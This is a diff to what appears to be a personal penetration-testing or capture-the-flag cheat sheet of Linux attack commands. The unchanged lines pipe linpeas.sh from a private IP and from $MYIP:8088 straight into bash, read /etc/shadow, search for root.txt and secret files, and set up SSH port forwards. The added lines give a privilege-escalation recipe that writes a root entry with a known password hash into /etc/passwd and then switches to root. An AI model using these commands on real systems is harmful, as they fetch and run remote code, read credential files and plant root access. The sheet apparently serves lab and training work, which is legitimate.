@@ -431,6 +431,13 @@ wget -qO- 192.168.214.128/linux/linpeas.sh | bash
 curl 192.168.214.128/linux/linpeas.sh | bash
 
 ## Linux
+[*] Priviledge Escalation
+nano /etc/passwd
+mkpasswd -m descrypt 'password'
+root:Vg4sD8/6ZPqpk:0:0:root:/root:/usr/bin/bash
+su root
+password
+
 [*] Enumeration
 find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
 find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
@@ -446,6 +453,8 @@ cat /etc/shadow
 curl $MYIP:8088/linpeas.sh | bash
 su $USERNAME --preserve-environment
 ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
+
+
 
 [*] Upgrade TTY
 python3 -c 'import pty; pty.spawn("/bin/bash")';
